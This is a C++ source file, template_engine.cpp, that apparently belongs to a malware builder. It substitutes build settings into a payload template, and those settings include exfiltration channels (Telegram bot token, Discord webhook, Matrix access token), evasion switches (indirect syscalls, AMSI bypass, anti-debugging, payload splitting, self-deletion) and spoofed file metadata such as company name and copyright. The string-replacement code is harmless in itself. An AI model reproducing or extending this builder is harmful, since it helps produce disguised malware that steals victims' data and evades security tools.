// builder/template_engine.cpp
#include "template_engine.h"
#include <sstream>

std::string TemplateEngine::ReplaceVariables(const std::string& content,
                                              const std::unordered_map<std::string, std::string>& vars) {
    std::string result = content;
    for (const auto& [key, value] : vars) {
        std::string placeholder = "{{" + key + "}}";
        size_t pos = 0;
        while ((pos = result.find(placeholder, pos)) != std::string::npos) {
            result.replace(pos, placeholder.length(), value);
            pos += value.length();
        }
    }
    return result;
}

std::unordered_map<std::string, std::string> TemplateEngine::SettingsToMap(const BuilderConfig::BuildSettings& s) {
    return {
        {"BOT_TOKEN", s.botToken},
        {"CHAT_ID", s.chatId},
        {"EXFIL_MODE", std::to_string(static_cast<int>(s.channel))},
        {"DISCORD_WEBHOOK", s.discordWebhook},
        {"MATRIX_HOMESERVER", s.matrixHomeserver},
        {"MATRIX_ACCESS_TOKEN", s.matrixAccessToken},
        {"MATRIX_ROOM_ID", s.matrixRoomId},
        {"USE_SYSCALLS", s.evasion.useIndirectSyscalls ? "1" : "0"},
        {"USE_AMSI_BYPASS", s.evasion.useAmsiBypass ? "1" : "0"},
        {"USE_ANTI_DEBUG", s.evasion.useAntiDebug ? "1" : "0"},
        {"USE_PAYLOAD_SPLITTING", s.evasion.usePayloadSplitting ? "1" : "0"},
        {"USE_SELF_DELETE", s.evasion.useSelfDelete ? "1" : "0"},
        {"COMPANY_NAME", s.companyName},
        {"COPYRIGHT", s.copyright},
        {"FILE_VERSION", s.fileVersion}
    };
}